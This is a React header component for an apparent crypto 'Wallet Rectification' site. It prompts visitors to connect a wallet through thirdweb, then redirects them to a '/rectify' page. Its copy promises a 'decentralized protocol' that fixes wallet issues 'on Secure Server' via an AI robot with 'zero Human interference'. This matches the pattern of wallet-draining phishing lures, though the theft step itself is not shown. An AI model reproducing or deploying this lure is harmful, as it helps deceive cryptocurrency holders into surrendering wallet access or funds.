import React, { useState } from "react";
import header_img from "../images/img-hero-img-home-2.png";
import { ConnectWallet } from "@thirdweb-dev/react";

function Header() {

  const [hide, setHide] = useState(false);
  return (
    <>
      <div className="hero2-main">
        <div className="container-fluid">
          <div className="row row-custom">
            <div className="col-lg-5 col-content-otr">
              <div className="col-content-inr">
                <h1 className="heading heading-h1">Wallet Rectification</h1>
                <p className="desc heading-L">
                  Every digital artwork on Upside is authentic and truly unique.
                  Blockchain technology makes this new aproch to digital
                  ownership possible.
                </p>
                <p className="desc heading-L">
                  Open and decentralized protocol for syncing various Wallets
                  issues on Secure Server. This is not an app but a protocol
                  that establishes a remote resolution between all noncustodial
                  wallet
                </p>
                <p className="desc heading-L">
                  It is an online server which gets you across to every wallet
                  representative to enable effective complain and rectification
                  of issues.
                </p>
                <p className="desc heading-L">
                  You will be on a chat with an Artificial Intelligence Robot
                  with zero Human interference.
                </p>
                <div className="action">
                  <ConnectWallet
                  className="btn-primary-1 btn-hero heading-SB connectBtn"
                    auth={{
                      loginConfig: {
                        // The URL to redirect to on login.
                        redirectTo: "/rectify",
                        // Function to run on error.
                        onError: function (error) {
                          console.error("Error:", error);
                        },
                        // Function to run on success.
                        onSuccess: function () {
                          // This function will be called after the login process is complete.
                          setHide(true)
                        },
                      },
                      // If you want users to sign in after connecting their wallet
                      loginOptional: false,
                      loginOptions: {
                        // The optional nonce of the login request used to prevent replay attacks
                        nonce: "",
                        // The optional time after which the login payload will be invalid
                        expirationTime: new Date(),
                        // The optional chain ID that the login request was intended for
                        chainId: 0,
                      },
                    }}
                    onConnect={() => {
                      // This function will be called after the user has connected their MetaMask wallet.
                      setHide(true)
                    }}
                    onDisconnect={() => {
                      // This function will be called after the user has disconnected their MetaMask wallet.
                      console.log("MetaMask is disconnected");
                    }}
                  />

                  
                  <div className="btn-hero heading-SB" id="slect-main">
                    <select
                      className="select2-hidden-accessible select2"
                      id="select2-main"
                      aria-invalid="false"
                      data-select2-id="select2-data-1-x6av"
                      tabIndex="-1"
                      aria-hidden="true"
                    >
                      <option value="">Select Chain</option>
                      <option value="0x1" data-select2-id="select2-data-3-rcyi">
                        Ethereum
                      </option>
                      <option
                        value="0x38"
                        data-select2-id="select2-data-30-ir32"
                      >
                        Binance S
                      </option>
                      <option
                        value="0x89"
                        data-select2-id="select2-data-31-w03z"
                      >
                        Polygon
                      </option>
                      <option
                        value="0xa86a"
                        data-select2-id="select2-data-32-71oo"
                      >
                        Avalanche
                      </option>
                      <option
                        value="0xfa"
                        data-select2-id="select2-data-33-hulu"
                      >
                        Fantom
                      </option>
                      <option
                        value="0x19"
                        data-select2-id="select2-data-35-silk"
                      >
                        Cronos
                      </option>
                    </select>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <img className="hero-img" src={header_img} alt="img" />
        </div>
        <div><h1 style={{color:"#ffffff", display: hide ? "block" : "none"}}>Testing</h1></div>
      </div>
    </>
  );
}

export default Header;
